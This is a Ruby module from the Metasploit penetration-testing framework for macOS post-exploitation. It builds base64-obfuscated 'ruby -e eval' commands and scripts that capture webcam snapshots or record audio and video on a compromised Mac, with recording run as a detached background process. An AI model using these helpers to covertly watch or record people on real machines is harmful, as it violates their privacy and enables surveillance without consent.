module Msf
class Post
module OSX
module RubyDL
  # This adds some compatibility patches to the Ruby runtime so we can use
  # (somewhat) the ruby DL lib on both 1.8 and 1.9.
  # @return [String] ruby code to inject somewhere for compatibility
  def osx_ruby_dl_header
    <<-EOS
      require 'dl'
      require 'dl/import'

      #### Patches to DL (for compatibility between 1.8->1.9)

      Importer = if defined?(DL::Importer) then DL::Importer else DL::Importable end

      def ruby_1_9_or_higher?
        RUBY_VERSION.to_f >= 1.9
      end

      def malloc(size)
        if defined?(DL::CPtr)
          DL::CPtr.malloc(size)
        else
          DL::malloc(size)
        end
      end

      # the old Ruby Importer defaults methods to downcase every import
      # This is annoying, so we'll patch with method_missing
      if not ruby_1_9_or_higher?
        module DL
          module Importable
            def method_missing(meth, *args, &block)
              str = meth.to_s
              lower = str[0,1].downcase + str[1..-1]
              if self.respond_to? lower
                self.send lower, *args
              else
                super
              end
            end
          end
        end
      end
    EOS
  end

  # @param [String] ruby_code string containing valid Ruby code to run in command
  # @return escaped string
  def obfuscated_ruby_cmd(ruby_code)
    ruby_cmd_base64 = [ruby_code].pack('m*').gsub(/\s+/, '')
    "ruby -e \"eval('#{ruby_cmd_base64}'.unpack('m*')[0])\""
  end


  # Builds and returns a ruby script for capturing media on an OSX machine.
  #
  # @param [Hash] opts the options hash
  # @option opts [String] :action (list|snapshot|record). The action to perform. defaults to list.
  # @option opts [String] :snap_filtype (jpg|png|gif|tiff|bpm). The type of file
  #   to save a snapshot as. defaults to png.
  # @option opts [Boolean] :audio_enabled defaults to true.
  # @option opts [Boolean] :video_enabled defaults to true.
  # @option opts [Integer] :num_chunks the number of "chunks" to read from the client
  # @option opts [Integer] :chunk_len the duration (in seconds) of a single chunk
  # @option opts [Integer] :audio_device the index of the audio device (run with action=list first)
  # @option opts [Integer] :video_device the index of the video device (run with action=list first)
  # @option opts [String]  :preset the quality preset to use. (run with action=list first)
  # @option opts [String]  :record_file the path to save the movie on the client
  # @option opts [String]  :snap_file the path to save the snapshot on the client
  # @return [String] OSX-compatible ruby script to run
  def osx_capture_media(opts)
    script_file = ::File.join(Msf::Config.install_root, %w(external source osx capture_media.rb))
    capture_media_script = ::File.read(script_file)
    capture_code = <<-EOS
      #{osx_ruby_dl_header}

      options = {
        :action => '#{opts.fetch(:action, 'list')}', # or list|snapshot|record
        :snap_filetype => '#{opts.fetch(:snap_filetype, 'png')}', # jpg|png|gif|tiff|bmp
        :audio_enabled => #{opts.fetch(:audio_enabled, true)},
        :video_enabled => #{opts[:video_enabled]},
        :num_chunks => #{opts[:num_chunks]}, # wachawa!
        :chunk_len => #{opts[:chunk_len]}, # save chunks every 5 seconds
        :video_device => #{opts[:video_device]}, # automatic
        :audio_device => #{opts[:audio_device]},
        :snap_jpg_compression => #{opts[:snap_jpg_compression]}, # compression ratio (between 0 & 1), JPG ONLY
        :preset => '#{opts[:preset]}',
        :record_file => '#{opts[:record_file]}',
        :snap_file => '#{opts[:snap_file]}'
      }

      #{capture_media_script}
    EOS

    # FOOOOOORK.
    if opts[:action] == 'record'
      capture_code = %Q|
        cpid = fork do
          #{capture_code}
        end
        Process.detach(cpid)
        puts cpid
        sleep(1)
      |
    end
    capture_code
  end
end

end
end
end